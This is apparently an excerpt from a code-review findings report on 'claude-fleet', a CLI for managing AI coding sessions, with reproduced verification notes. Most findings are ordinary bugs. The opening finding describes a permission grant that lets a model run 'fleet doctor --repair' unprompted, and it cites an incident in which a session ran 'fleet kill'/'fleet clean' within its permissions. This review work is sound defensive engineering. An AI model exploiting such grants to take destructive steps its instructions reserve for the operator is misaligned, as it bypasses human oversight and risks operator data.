- *(confidence: high)* I tried to break every citation and could not. Every line the reviewer quotes reads as they say it does.  VERIFIED CITATIONS: - `C:\proga\claude-fleet\commands\doctor.md:3` — `allowed-tools: 'Bash(fleet doctor:*)'`. Body lines 11-14 do say "let the operator run it." - `C:\proga\claude-fleet\commands\overview.md:3` — grant list includes `Bash(fleet doctor:*)`; body line 36 says "do not run it yourself." - `C:\proga\claude-fleet\bin\fleet.py:9079-9084` — `repair = bool(getattr(args, "repair", False))` then `if repair: with fleet_lock(): data = load_registry()  # the ONE quarantine site left`. So `--repair` really is the sole lock-taking quarantine write; without it the code path is `read_registry_no_repair(hint=False)`. - `bin/fleet.py:705-710` and `16192-16198` confirm `--repair` is the one rename verb. - `tests/test_terminal_surface.py:727` — `READ_ONLY_COMMANDS = {"overview", "status", "peek", "result", "doctor"}`, so both files ARE classified read-only. - `tests/test_terminal_surface.py:768-783` — `DESTRUCTIVE_VERBS` has no `doctor`, and the assertion is a substring test `f"fleet {verb}" not in grant`. - `tests/test_view_quarantine.py:674-691` — the `--repair` ban is scoped to `re.findall(r"!`([^`]*)`", body)`, i.e. inline-exec spans only, and the docstring says that scoping is deliberate.  PROOFS I RAN: - `py -3.13 -m pytest -q tests/test_terminal_surface.py -k read_only` → 16 passed. The lints are green with the grant in place, so they demonstrably do not catch it. - A snippet replaying `DESTRUCTIVE_VERBS` against both frontmatters printed `lint hits: []` for `doctor` and `overview`, while `Bash(fleet doctor:*)` prefix-matches `fleet doctor --repair`.  REFUTATION ANGLES I TESTED AND REJECTED: 1. "Maybe `allowed-tools` only authorizes the inline `!` exec, not model-initiated Bash calls." The repo's own threat model says otherwise: `tests/test_terminal_surface.py:763-767` records the 2026-07-09 incident where `Bash(fleet:*)` on a read-only command let a session run `fleet kill`/`fleet clean` "fully within permissions," and `docs/specs/terminal-surface.md:198,294` define mutating commands as those where "the model runs the CLI via Bash → permission prompt applies." The premise the finding relies on is the premise the whole D3 doctrine rests on. 2. "Maybe the doctrine intended this." The opposite — `bin/fleet.py:12611-12613` states the gate's intent verbatim: "Putting the rename behind an explicit flag makes it a deliberate operator act instead of a side effect of four read-only-looking commands." A no-prompt grant on two of those four commands is precisely the side effect the gate removed. 3. "Maybe another lint covers it." Grepped `allowed-tools` across `tests/`, `tools/`, `skills/`, `docs/specs/` — the only grant assertions are the four at `tests/test_terminal_surface.py:758,773,781,797`, none of which reach `doctor --repair`. 4. Platform/stdlib: nothing Windows- or 3.10-specific is involved; this is a static frontmatter/permission-pattern issue.  The proposed fix is also viable and I checked it does not break an existing pin: `commands/doctor.md` inline-execs exactly `` !`fleet doctor` ``, so an exact-match `Bash(fleet doctor)` suffices, and `overview`'s `Bash(fleet status:*)` must stay because `tests/test_view_quarantine.py:666-672` pins that spelling for `--stale-ok`.
- *(confidence: high)* I tried to refute this on reachability and could not. Every mechanical element checks out:  1. GRANT IS REAL AND MATCHES. `C:\proga\claude-fleet\commands\doctor.md:3` is `allowed-tools: 'Bash(fleet doctor:*)'` and `C:\proga\claude-fleet\commands\overview.md:3` includes `Bash(fleet doctor:*)`. Bash permission rules are prefix matches, so `fleet doctor --repair` is covered.  2. THE FLAG IS REAL AND IS THE SOLE WRITE. `bin/fleet.py:16192-16198` registers `--repair` on the doctor subparser; `bin/fleet.py:9079-9084` is the only remaining quarantine site (`if repair: with fleet_lock(): data = load_registry()  # the ONE quarantine site left`). `load_registry` (bin/fleet.py:752, 758) calls `_quarantine_registry(path)`, which renames the file aside.  3. THE STATE IS REACHABLE, NOT CONTRIVED. The quarantine only fires when the registry is already corrupt — and that is exactly the state in which `/fleet:doctor`'s own inline output actively names the fix: `_doctor_check_registry` (bin/fleet.py:9043-9046) prints "Rerun as `fleet doctor --repair` to quarantine it". So the pre-approved destructive command is being recommended, in-band, to a model holding a matching grant.  4. NO UPSTREAM GUARD. `.claude/settings.json` is `{"worktree": {"bgIsolation": "none"}}` — no deny rule. The only guard is prose in the command bodies ("let the operator run it", "do not run it yourself"), which is precisely the class of guard the repo's own 2026-07-09 incident (quoted at tests/test_terminal_surface.py:763-767) established as insufficient.  5. BOTH LINTS CONFIRMED TO MISS IT. `tests/test_terminal_surface.py:727` puts `doctor` in READ_ONLY_COMMANDS, so `test_read_only_grants_reach_no_destructive_subcommand` (line 779-783) does run on it — but DESTRUCTIVE_VERBS (line 768-769) is verb-level only and omits `doctor`, so a flag-level mutation slips through. `tests/test_view_quarantine.py:674-691` bans `--repair` only inside `!`…`` inline-exec spans and documents that scoping as deliberate. A grep for `allowed-tools` across tests/ returns only those seven lines in test_terminal_surface.py — nothing anywhere asserts that a read-only grant fails to match `fleet doctor --repair`.  What I DO refute is the impact half of the failure scenario. The clause "every surface then reports the fleet as fresh and healthy" is false against this code: `_quarantine_artifacts()` (bin/fleet.py:646-700) is read by five call sites specifically to tell "repaired incident" from "fresh install" — `_sweep_husks`, `_doctor_check_autoclean`, `_require_claim_holder`'s §9 arm, `_acting_worker_identity` (bin/fleet.py:2292-2294), and `_identity_abstention_note` (bin/fleet.py:12397-12403, which says "this absence is a repaired incident and not a fresh install"). And `_doctor_check_registry(repaired=True)` (bin/fleet.py:9040-9042) emits a FAIL row saying the registry "was corrupt and has been quarantined". Nor is it "real data loss" in the 2026-07-09 sense: the rename preserves the bytes under `state/fleet.json.corrupt.<ts>` (mtime preserved, per the rule-1 note at bin/fleet.py:667-670), and it only fires against a file no fleet verb could parse in the first place. On a healthy registry `fleet doctor --repair` is a pure no-op — cmd_doctor never writes.  So: a genuine gap in an explicitly-stated invariant, reachable exactly as described, but the blast radius is an unprompted, loudly-reported, artifact-guarded rename of an already-unusable file — not the operator's live worker records.

---

## P2 — CONFIRMED medium (11)

Real defects with a narrower blast radius, or wrong operator guidance.

### P2-1 — `fleet init --statusline` writes an unquoted command; a space in the python or fleet path breaks it silently

- **Severity:** medium  |  **Verdict:** CONFIRMED  |  **Dimension:** `cli-errors`  |  **Category:** correctness
- **Location:** `bin/fleet.py:3668`

**What is wrong**

`_install_statusline` composes the statusLine command with no quoting at all:

```python
    settings["statusLine"] = {
        "type": "command",
        # Forward slashes: this command string is executed through a shell.
        "command": f"{Path(sys.executable).resolve().as_posix()} {script}",
        "refreshInterval": 10,
    }
```
(bin/fleet.py:3665-3670, `script = statusline_script_path().resolve().as_posix()` at :3642)

The comment on the very next line acknowledges the string is run through a shell, yet neither path is quoted. Every other place in this repo that builds a shell command from these same two paths DOES quote them:
* `worker-settings.template.json`: `"command": "\"{{PYTHON}}\" \"{{FLEET_HOME}}/bin/hooks/posttooluse_mailbox.py\""`
* `_steer_supervisor_release` (bin/fleet.py:6229): `f'  "{py}" "{fleet_py}" sup-release ...'`
* `docs/specs/autoclean.md:100`: `running `"<python>" "<fleet.py>" autoclean --fleet-home "<home>"``

The only test on this string is `test_statusline_command_uses_forward_slashes` (tests/test_terminal_surface.py:1263-1267), which asserts `"\\" not in cmd` and nothing about quoting.

Rendered for an all-users Python install:
```
'C:/Program Files/Python313/python.exe C:/Users/Jane Doe/fleet/bin/fleet_statusline.py'
```

**Failure scenario**

Operator has the default all-users Windows Python (`C:\Program Files\Python313\python.exe`) — or any POSIX/Windows fleet home under a path with a space — and runs `fleet init --statusline`. `fleet init` prints `installed statusLine into ...` and exits 0. Claude Code then executes `C:/Program Files/Python313/python.exe C:/proga/claude-fleet/bin/fleet_statusline.py` through a shell, which splits on the space and tries to run `C:/Program`. The command fails on every refresh; Claude Code renders nothing. The operator sees a permanently blank statusline with no error anywhere and no way to tell why — the exact failure mode the pure-ASCII-render comment at bin/fleet_statusline.py:36-42 was written to eliminate.

**Fix**

Quote both components, matching the template and `_steer_supervisor_release`:
```python
        "command": f'"{Path(sys.executable).resolve().as_posix()}" "{script}"',
```
and add an assertion to `test_statusline_command_uses_forward_slashes` (or a sibling) that the interpreter and script paths are each quoted, so the next edit cannot drop it again.

**Verification** — 2 independent skeptics, neither could refute:

- *(confidence: high)* The reachability lens does not refute this finding; it corroborates it.  REACHABLE: bin/fleet.py:3777-3779 (`cmd_init`) calls `_install_statusline` on `fleet init --statusline`, a shipped, documented operator command (docs/specs/terminal-surface.md:232 §4.7, D6 at :98). The only gate is `_supervisor_gate("init", ...)`, which is inert for a human shell with no session id — precisely the caller who runs init at setup. The composed string at :3670 is written verbatim into ~/.claude/settings.json.  INPUT UNGUARDED: `script` (:3644) is `FLEET_HOME/bin/fleet_statusline.py` (:312-313) and the interpreter is raw `Path(sys.executable).resolve().as_posix()`. Nothing validates, rejects, or normalizes a space in either. Grepping for space/quoting handling in bin/fleet.py finds only the sites that already solved the same problem elsewhere: :8009-8021 ("a prior fix for spaced install paths"), :13396-13398 ("every rendered path is double-quoted -- a space under FLEET_HOME must not split the command"), and worker-settings.template.json:4-9 which quotes both components. The removed N1 init guard concerned linked worktrees, not paths. So `_install_statusline` is the single unquoted holdout against the repo's own stated doctrine.  MECHANISM CONFIRMED EMPIRICALLY: I created `<scratchpad>/sp ace/hi.py` and ran the exact composed shape. `cmd /c "C:/.../python.exe C:/.../sp ace/hi.py"` -> `can't open file '...\sp'`, rc=2; the quoted form printed STATUSLINE-OK, rc=0. `sh -c` with the script path unquoted produced the same split and rc=2; quoted, rc=0. Both candidate shells split. Fleet's own `bin/fleet_statusline.py:290-295` runs a settings.json command string with `shell=True`, i.e. the repo treats these strings as shell input.  SILENT: there is no doctor check over the installed statusLine command (none of the `_doctor_check_*` functions at :7899-14609 inspect ~/.claude/settings.json's statusLine), and `fleet init` prints "installed statusLine into ..." and exits 0. The operator sees a blank statusline with no diagnostic anywhere.  The reviewer's characterization of test coverage is accurate: tests/test_terminal_surface.py:1263-1267 asserts only `"\\" not in cmd`; nothing asserts quoting.  Residual uncertainty is only about the exact rendering Claude Code does on a nonzero-exit statusLine (blank vs. stderr passthrough), which does not change the defect. Not refuted.
- *(confidence: high)* I tried to break this finding and could not. (1) Re-read bin/fleet.py:3667-3672 — the statusLine command is f"{Path(sys.executable).resolve().as_posix()} {script}" with zero quoting; the comment on line 3669 itself states the string is executed through a shell. (2) I reproduced the exact rendered value by calling fleet._install_statusline() with sys.executable='C:\\Program Files\\Python313\\python.exe' and a script under 'C:/Users/Jane Doe/...': it wrote 'C:/Program Files/Python313/python.exe C:/Users/Jane Doe/fleet/bin/fleet_statusline.py', printed 'installed statusLine into ...', and returned 0. (3) I proved the shell actually splits it: in real Git Bash, sh -c "<python> <dir with space>/fleet_statusline.py" gives "can't open file '...\\Jane': [Errno 2] No such file or directory", exit 2, while the quoted form prints the script's output and exits 0. (4) The shell premise is the repo's own — bin/fleet_statusline.py:293-295 runs chained delegates with shell=True ("the command is a shell string straight out of settings.json") and docs/specs/terminal-surface.md:253 says the same. (5) The reviewer's comparison sites check out: worker-settings.template.json:4-9 quotes both {{PYTHON}} and {{FLEET_HOME}}; bin/fleet.py:6232 builds '"{py}" "{fleet_py}" sup-release ...' from the identical Path(sys.executable).as_posix() pair. This call site is the outlier. (6) No coverage exists: tests/test_terminal_surface.py:1263-1267 only asserts '\\' not in cmd, :1256-1261 only asserts the substring and type, no test executes the command, and cmd_doctor (bin/fleet.py:9049) has no statusline-command check; nothing in docs/OPERATOR-GATES.md or PLAN-PROGRESS.md records it as known. (7) The "we don't support spacey paths" defense is unavailable — docs/reviews/ME-DEFECTS-REVIEW-BREAK-2026-07-21.md:98-106 is a fixed finding specifically about FLEET_HOME = "C:\\Program Files\\My Fleet". Refutation attempts rejected: cmd.exe prefix-probing (Claude Code on Windows goes through Git Bash sh -c per CLAUDE.md's forward-slash rule, and cmd.exe fails on unquoted spacey paths too); .resolve() yielding 8.3 short paths (it does not); an existing test/doctor check (none). Only fair narrowing is scope: --statusline is opt-in and the bug requires a space in sys.executable or FLEET_HOME — both common on Windows (all-users Python in C:\Program Files, or a user profile like C:\Users\Jane Doe). Minor citation errors that do not affect the substance: the offending line is 3670 (finding says 3668) and the `script =` assignment is at 3644 (finding says 3642).

---

### P2-2 — terminal-surface.md D4/invariant-6 still assert views quarantine and take fleet.lock — false since doctor-repair merged

- **Severity:** medium  |  **Verdict:** CONFIRMED  |  **Dimension:** `docs-drift`  |  **Category:** stale-normative-claim
- **Location:** `docs/specs/terminal-surface.md:68`

**What is wrong**

`docs/specs/terminal-surface.md:68`:
```
**THE CURRENT STATE — the requirement is MET by the statusline and VIOLATED by every read-only `/fleet:*` command.** Measured 2026-07-27 at `02bf276` … this paragraph is not to be deleted until they say something else.
```
`:71` — "`fleet status` (bare), `fleet peek`, `fleet result` and `fleet doctor` each take `fleet_lock()` and then `load_registry()`, and `load_registry()` **renames a corrupt `state/fleet.json` aside**."
`:287` (invariant 6) — "**Shipped code holds this for the statusline only.** … so this invariant is presently violated through the slash-command surface … `doctor-repair` is the slice that closes the gap."

`doctor-repair` merged (commit `0c873b6`, 2026-07-27) and `CLAUDE.md:13` was updated to say the rule is now "TRUE OF SHIPPED CODE", but terminal-surface.md — the document CLAUDE.md points at as the source of record — was not. Re-measured at HEAD `d019066` with the spec's own probe shape:
```
fleet status         survives      (quarantine)
fleet peek w         survives
fleet result w       survives
fleet doctor         survives

fleet status         TAKES fleet.lock   (lock contention)
fleet peek w         lock-free
fleet result w       lock-free
fleet doctor         lock-free
```
Code confirms: `bin/fleet.py:4341` (`cmd_peek` → `read_registry_no_repair()`), `:4392` (`cmd_result`), `:4062` (`cmd_status` pre-probe read), `:9087` (`cmd_doctor` → `read_registry_no_repair(hint=False)`). Only bare `fleet status` still takes the lock, and no `/fleet:*` template invokes it (`commands/status.md:6` and `commands/overview.md:14` both inline `fleet status --stale-ok`).

**Failure scenario**

A contributor opens the terminal-surface spec (CLAUDE.md sends them there for the D4 receipts) and reads that `/fleet:status`, `/fleet:peek`, `/fleet:result` and `/fleet:doctor` currently quarantine a corrupt registry and are 'step 2 of the privilege-escalation repro'. They either re-do the already-landed doctor-repair work, or — worse — an operator with a corrupt registry avoids the read verbs that are now the safest way to diagnose it, and reaches for `fleet doctor --repair` instead, destroying the evidence D4 exists to protect.

**Fix**

Rewrite `:68-72` and the invariant-6 bullet at `:287` as history (dated, past tense, 'measured at 02bf276, closed by doctor-repair at 0c873b6'), and add a matching post-fix receipt block pinned at a commit at or after `0c873b6` beside the existing `# at 02bf276` blocks so the CURRENT STATE claim is itself measured. The 02bf276 receipts stay — they are correct about that commit.

**Verification** — 2 independent skeptics, neither could refute:

- *(confidence: high)* I re-read every cited line and re-ran both of the spec's own probes at HEAD; the reviewer's reading is correct on all counts.  CONTROL FLOW VERIFIED: bin/fleet.py:4064 (cmd_status pre-probe), :4343 (cmd_peek), :4394 (cmd_result), :9089 (cmd_doctor) all go through read_registry_no_repair(), which by its own docstring at :742 does "same validation, no rename". _quarantine_registry is now reached only from load_registry (:752, :758), and cmd_status's remaining `with fleet_lock(): load_registry()` at :4104 sits AFTER the refusing pre-probe read, so a corrupt registry never reaches it.  MEASURED (scratch FLEET_HOME, no live state touched): quarantine probe -> status/peek/result/doctor/sup-status all "survives" (the pinned 02bf276 receipt at :310-317 shows four "RENAMED ASIDE"). Lock probe -> bare `fleet status` still prints "fleet: timed out waiting for lock" (unconditional fleet_lock at :4104), while `peek w`, `result w` and `doctor` all answer immediately (unknown-worker errors / a full 20-row report). Identical to the reviewer's table.  TEMPLATES VERIFIED: commands/status.md:6 and commands/overview.md:14 are now `!`fleet status --stale-ok``, so no /fleet:* surface reaches the one verb that still locks. commands/peek.md:7 and result.md:7 still inline bare verbs, but those verbs are clean now. Doc line :71's claim that the four command files "inline the bare verbs" is therefore false at HEAD.  NOT ALREADY HANDLED: git log -- docs/specs/terminal-surface.md ends at f94045f, before the doctor-repair merge (9739e74 / 0c873b6). tests/test_views_doctrine.py runs 11 passed / 2 SKIPPED with reason "no view quarantines any more -- D4 is true of shipped code", i.e. the conditional pin deliberately stops asserting once the code is fixed, so nothing guards the leftover prose. tools/verify_receipts.py stays green because the receipts are correctly pinned `# at 02bf276` and remain true of that commit -- the doc is self-sealing stale: its own :68 says the paragraph "is not to be deleted until they [the receipts] say something else", and frozen receipts can never say something else. supervisor/JOURNAL.md:2974 records only that the CLAUDE.md qualifier was retired; no journal entry exempts terminal-surface.md.  PLATFORM/STDLIB: nothing OS-specific is misread; fleet_lock (bin/fleet.py:496) is an O_CREAT|O_EXCL file lock, and the pre-created lock file does block, which is why bare status times out and the other three do not.  Where the finding overreaches (correction, not refutation): the severity and the second half of the failure scenario. CLAUDE.md:13 -- the same sentence that points a contributor at terminal-surface.md D4 -- already states the rule is "TRUE OF SHIPPED CODE" and calls the REQUIREMENT/CURRENT-STATE split "(now-discharged)", and commands/doctor.md:11 plus commands/overview.md:36 both say doctor is report-only and that --repair is the operator's call. So the "operator destroys evidence with --repair" outcome requires ignoring the pointer text and the command help; the realistic harm is the first half only (a contributor believes landed work is still owed). Also the finding's fix scope is too narrow: :35 ("NOT met by the read-only /fleet:* commands"), :64 (D4's own parenthetical), :115 (architecture-diagram paragraph) and :266 ("a /fleet:status on a corrupt registry quarantines and exits 1") are stale by the same measurement and are not cited.
- *(confidence: high)* Could not refute; verified empirically and by reading callers. Re-ran both of the spec's own probe shapes against HEAD (d019066) in scratch temp: corrupt-registry probe gives `survives` for fleet status/peek w/result w/doctor (spec's pinned receipt at docs/specs/terminal-surface.md:308 says RENAMED ASIDE for all four); lock-contention probe gives `lock-free` for peek/result/doctor (spec receipt at :325 says TAKES fleet.lock). Code matches: bin/fleet.py:764 read_registry_no_repair() is documented as "load_registry() MINUS THE QUARANTINE" and its docstring names its callers as cmd_status's pre-probe read, cmd_peek, cmd_result, _resolve_worker_target, and cmd_doctor without --repair; bin/fleet.py:9087 uses read_registry_no_repair(hint=False) with the sibling branch commented "the ONE quarantine site left". Reachability lens: the misleading text is on a live reader path — CLAUDE.md:13 explicitly sends readers to terminal-surface.md D4 for receipts and calls the REQUIREMENT/CURRENT-STATE split "now-discharged", while D4 still reads VIOLATED. No upstream guard: the pin the spec promises at :75 ("that pin goes green on its own") is tests/test_views_doctrine.py:238, which now takes pytest.skip at :247 because it only ever forbade UNQUALIFIED restatement while the violation was live — it never asserts the qualified CURRENT-STATE prose is retired once fixed. So the stale claim is structurally unguarded. The pinned `# at 02bf276` receipts stay correct about that commit and verify green, which is why nothing flags the drift. Only weakness: the "operator avoids read verbs and reaches for --repair, destroying evidence" harm is somewhat speculative (the CLI itself emits REGISTRY_REPAIR_HINT naming the corrupt file); the contributor-re-does-landed-doctor-repair-work harm is concrete. Scope correction below.

---

### P2-3 — SKILL.md tells the manager to install/uninstall the sweep via `fleet init --autoclean`, a flag deleted 2026-07-27

- **Severity:** medium  |  **Verdict:** CONFIRMED  |  **Dimension:** `docs-drift`  |  **Category:** retired-feature-documented-as-shipping
- **Location:** `skills/fleet/SKILL.md:51`

**What is wrong**

`skills/fleet/SKILL.md:51` (the manager session's CLI reference table): "`--fleet-home` = explicit home override (resolved, must exist — **the scheduled task always passes it**, Task Scheduler has no operator env). **Installed as a Scheduled Task via `fleet init --autoclean [--autoclean-interval-hours N]` (default every 6h); uninstall via `fleet init --autoclean-remove`.**"

`skills/fleet/SKILL.md:86-87` likewise: "but **once the autoclean scheduler is installed**, its next husk sweep `claude rm`s that session too".

All three flags were removed with the timer (`docs/specs/autoclean.md:12-13`, `docs/SPEC.md:220`, commit `8eced09`). Verified at HEAD:
```
$ py -3.13 bin/fleet.py init --autoclean
fleet: error: unrecognized arguments: --autoclean
```
`bin/fleet.py:14726` confirms the removal in the parser comment; `grep -n "autoclean_task_" bin/fleet.py` returns nothing.

This directly contradicts line 25 of the same file, which correctly says the sweep 'is run by the tiers, not by a timer'.

**Failure scenario**

A manager session activates the fleet skill, reads the CLI table, and on a fresh machine runs `fleet init --autoclean` to 'set up the sweep'. Argparse rejects it. Worse for a manager that does not re-check: it reports to the operator that the staleness sweep is installed and scheduled, when in fact nothing sweeps unless a supervisor beat or the startup ritual runs it — the exact belief the autoclean amendment (`docs/specs/autoclean.md:104-107`) says the flags were deleted outright to prevent ('a flag that silently does nothing is how an operator comes to believe a sweep is installed when none is').

**Fix**

Strike the two Scheduled-Task sentences from `skills/fleet/SKILL.md:51` and the 'once the autoclean scheduler is installed' clause at `:86-87`; replace with the tier-driven wording already used at `:25`. Reword the `--fleet-home` gloss to match `bin/fleet.py:7778-7784` ('for any headless or cross-home caller', not 'the scheduled task').

**Verification** — 2 independent skeptics, neither could refute:

- *(confidence: high)* Reproduced at HEAD b7c5c85. skills/fleet/SKILL.md:51 does contain verbatim "Installed as a Scheduled Task via `fleet init --autoclean [--autoclean-interval-hours N]` (default every 6h); uninstall via `fleet init --autoclean-remove`", and :86-87 does contain "once the autoclean scheduler is installed". The flags are genuinely gone: `py -3.13 bin/fleet.py init --autoclean` returns "fleet: error: unrecognized arguments: --autoclean"; bin/fleet.py:16037-16041 documents the removal and refuses to keep them as accepted no-ops precisely because "a flag that silently does nothing is how an operator believes a sweep is installed when none is"; bin/fleet.py:3741-3749 (cmd_init docstring) states the timer is retired and points at skills/fleet/SKILL.md as the authority for the beat-driven replacement. No schtasks install path or _fleet_task_is_ours/autoclean_task_* symbol survives (the two `schtasks` grep hits at :357 and :9834 are prose). No test pins this wording: tests/test_supervisor.py:2369/:4008 and tests/test_terminal_surface.py:804-833 read SKILL.md for exit codes and command/skill parity only. No misread of control flow, Windows-vs-POSIX behavior, or stdlib semantics. SKILL.md is the operative instruction file loaded into a manager session, so this is instruction-that-does-not-work, not cosmetic doc drift, and it self-contradicts :25 of the same file.
- *(confidence: high)* Tried to refute on reachability and failed on every angle. (1) skills/fleet/SKILL.md is the live skill body loaded into any manager session that activates the fleet skill, and line 51 sits in its authoritative CLI reference table — not dead text. (2) The flags really are gone at HEAD (b7c5c85): `py -3.13 bin/fleet.py init --autoclean` and `--autoclean-remove` both exit with `unrecognized arguments`; bin/fleet.py:3741-3746 records the removal; tests/test_autoclean.py:709-713 pins the rejection. (3) No upstream guard: TestSchedulerSurfaceIsRetired (tests/test_autoclean.py:669-726) scans only bin/fleet.py source and the parser, and the only SKILL.md assertions in tests (test_terminal_surface.py:808,833; test_supervisor.py:2369) are about existence and exit codes. Nothing sweeps the skill docs, so the retirement pass left the operator-facing reference behind — precisely the stale-belief class docs/specs/autoclean.md:104-107 says the flags were deleted outright to prevent. The doc also contradicts line 25 of itself. I do downgrade the filed failure scenario and substitute a stronger one: `fleet init --autoclean` fails loudly (argparse exit 2), so that path self-corrects; the real harm is the never-satisfiable precondition at :85-87.

---

### P2-4 — --retire-all's HANDSHAKE refusal names a sup-handoff-complete that is guaranteed to refuse

- **Severity:** medium  |  **Verdict:** CONFIRMED  |  **Dimension:** `handoff`  |  **Category:** wrong-guidance / unreachable-remedy
- **Location:** `bin/fleet.py:14222`

**What is wrong**

```
        hs = read_handshake()
        if hs is not None:
            raise FleetCliError(
                f"supervisor/HANDSHAKE is present (inc={hs.get('incarnation_id')} "
                f"sid={hs.get('session_id')}) -- a successor got far enough to write "
                f"one, so this succession is still live. Complete it "
                f"(`sup-handoff-complete --expect-inc {hs.get('incarnation_id')} "
                f"--nonce <value>`) or abort it by handle first; ...")
```
The refusal assumes "HANDSHAKE present => that attempt is completable", but `cmd_sup_handoff_complete` verifies the TOKEN, not just the inc (bin/fleet.py:14082-14093), and `handoff_pending_append` re-stamps `claim["handoff_token_hash"]` on every new begin (bin/fleet.py:13777). A HANDSHAKE left behind by a superseded attempt therefore carries a hash the claim no longer holds, so the named remedy refuses unconditionally. This is the shape the repo's own 2026-07-26 R2 ruling forbids — see bin/fleet.py:11883: "a named remedy that always fails, which is the exact defect the 2026-07-26 ruling (R2) forbids writing into a refusal."

**Failure scenario**

Reproduced: begin A; A's successor boots and writes HANDSHAKE(A, hash(tokA)). The holder begins again (B) — `handoff_pending_append` supersedes A and the claim's `handoff_token_hash` becomes hash(tokB) — and B's successor is DOA, leaving a sid-less entry. The operator runs `fleet sup-handoff-abort --retire-all` and is refused with `sup-handoff-complete --expect-inc <A> --nonce <value>`. Running exactly that prints "HANDSHAKE token mismatch for inc=<A> -- ... NOT transferring (§6.4)". Every printed path is a dead end; the working command (`sup-handoff-abort --successor-inc <A>`, which takes arm 1 and clears the HANDSHAKE) is named nowhere.

**Fix**

In `_cmd_sup_handoff_retire_all`, compare `hs.get("handoff_token_hash")` against `claim.get("handoff_token_hash")` before composing the refusal. When they match, keep today's text; when they do not (or the claim holds no hash), say the HANDSHAKE belongs to a superseded/stale attempt that can no longer complete, and name `fleet sup-handoff-abort --successor-inc <hs inc> --nonce <value>` as the remedy that actually clears it.

**Verification** — 2 independent skeptics, neither could refute:

- *(confidence: high)* REACHABILITY HOLDS — I reproduced the state with real code paths, no hand-built claim.  What I checked for an upstream guard, and found none: - `cmd_sup_handoff_begin` (bin/fleet.py:13650-13820) never calls `read_handshake()` and never unlinks `handshake_path()`. Only complete (14174), abort (14348) and the seize/limit-transfer arm (11811) remove it. So a second begin over a live HANDSHAKE is unblocked. - begin re-stamps `claim["handoff_token_hash"] = nonce_digest(handoff_token)` at bin/fleet.py:13779 (the finding cites 13777/`handoff_pending_append`; the supersede loop is in `handoff_pending_append` at 10943-10948, the hash re-stamp is in begin at 13779 — a minor attribution slip, not a refutation). - `read_handshake()` (10339) does no age/validity filtering, so the stale HANDSHAKE is still `is not None` at the `--retire-all` guard (14223). - `cmd_sup_handoff_complete` compares `hs.get("handoff_token_hash")` to `claim["handoff_token_hash"]` (bin/fleet.py:14082-14093), so after begin B it refuses for inc A under every input.  Reproduction (scratchpad script driving the real `cmd_sup_handoff_begin` / `cmd_sup_boot --handoff-inc --handoff-token` / `cmd_sup_handoff_abort` / `cmd_sup_handoff_complete`, token read out of the generated task file):   begin A rc 0 -> successor A sup-boot rc 0 -> `claim hash == hs hash? True`   begin B (DOA) -> `claim hash == hs hash after B? False`, `HANDSHAKE still present? True`   `--retire-all` -> "supervisor/HANDSHAKE is present (inc=A ...) ... Complete it (`sup-handoff-complete --expect-inc A --nonce <value>`) or abort it by handle first"   `sup-handoff-complete --expect-inc A` -> "HANDSHAKE token mismatch for inc=A ... NOT transferring (§6.4)"   `sup-handoff-abort --successor-inc A` -> rc 0, one `claude stop` call, HANDSHAKE removed.  So the named `sup-handoff-complete` remedy is indeed guaranteed to refuse in that state. The finding is not unreachable, not already handled, and not dead code.  WHERE IT IS WRONG (why I downgrade rather than confirm as written): the failure scenario asserts "Every printed path is a dead end" and "the working command ... is named nowhere". The full refusal (bin/fleet.py:14224-14231) continues "... or abort it by handle first; --retire-all is for attempts no session answers for" — and abort-by-handle is exactly the remedy I proved works (arm 1 of `resolve_handoff_abort`, bin/fleet.py:10816-10827). The refusal already points at a working escape hatch; it just also lists a lever that cannot fire, and its premise sentence ("this succession is still live. Complete it") is false about completability. That is materially weaker than the R2 shape quoted at 11883, where the ONLY offered lever always fails.  Also relevant to the fix's scope: a single-begin path reaches the same dead-end `complete` — `handoff_boot_refusal(read_incarnation(), args.handoff_inc)` (bin/fleet.py:11703) never validates `--handoff-token`, so a successor booting without it writes a HANDSHAKE with no `handoff_token_hash` and `complete` refuses forever under "the predecessor claim carries no handoff token".  Severity: low, not medium — misleading error text with a working alternative printed in the same sentence; no state corruption, no data loss, no wedge.
- *(confidence: high)* I reproduced the scenario end-to-end with a standalone script driving the real entry points (cmd_sup_handoff_begin, cmd_sup_boot, cmd_sup_handoff_abort, cmd_sup_handoff_complete) against a sandboxed FLEET_HOME on py -3.13. Every mechanical claim holds: (a) cmd_sup_handoff_begin has no HANDSHAKE guard -- read_handshake() call sites are only bin/fleet.py:13070 (sup-status), :14075 (complete), :14223 (retire-all), :14339 (abort) -- so a second begin with a HANDSHAKE on disk is allowed and nothing unlinks it; (b) bin/fleet.py:13779 re-stamps claim["handoff_token_hash"] on every begin, so after begin B the claim holds hash(tokB) while HANDSHAKE still holds hash(tokA) (observed: "claim token hash == hash(tokA)? False", HANDSHAKE handoff_token_hash 9eca4de8...); (c) --retire-all refused with the exact text naming `sup-handoff-complete --expect-inc <A> --nonce <value>`; (d) running exactly that produced "HANDSHAKE token mismatch for inc=<A> ... NOT transferring (§6.4)" from the gate at :14084-14095; (e) `sup-handoff-abort --successor-inc <A>` took resolve_handoff_abort arm 1 (:10813-10825), returned rc 0, unlinked the HANDSHAKE and dropped entry A, after which --retire-all works. No existing test covers this: tests/test_handoff_seams.py:1426-1432 pins the refusal only for a non-superseded HANDSHAKE (write_handshake right after a single begin), which is the case where complete is the correct advice. The reviewer did overstate in two places, which narrows severity but does not refute: the refusal text does name the working remedy in prose ("or abort it by handle first"), so it is not an R2 total dead end -- one spelled-out remedy is dead, the correct one is present but unspelled -- and the re-stamp lives in cmd_sup_handoff_begin, not handoff_pending_append as the evidence text asserts. What survives cleanly as a defect is the docstring at :14216-14218 asserting "A live HANDSHAKE refuses the whole call -- that attempt is completable", which is false whenever a later begin superseded the attempt that wrote the HANDSHAKE.

---

### P2-5 — `fleet init --statusline` writes an unquoted shell command; a space in the Python or repo path silently kills the statusline

- **Severity:** medium  |  **Verdict:** CONFIRMED  |  **Dimension:** `hooks-statusline`  |  **Category:** silent-failure
- **Location:** `bin/fleet.py:3670`

**What is wrong**

```python
settings["statusLine"] = {
    "type": "command",
    # Forward slashes: this command string is executed through a shell.
    "command": f"{Path(sys.executable).resolve().as_posix()} {script}",
    "refreshInterval": 10,
}
```
Neither path is quoted, and the comment on the line above states the string is executed through a shell (fleet's own `_run_delegate` runs the analogous string with `shell=True`).

The repo already knows this is wrong for hook commands and fixed it there: `worker-settings.template.json` wraps both segments in escaped double quotes —
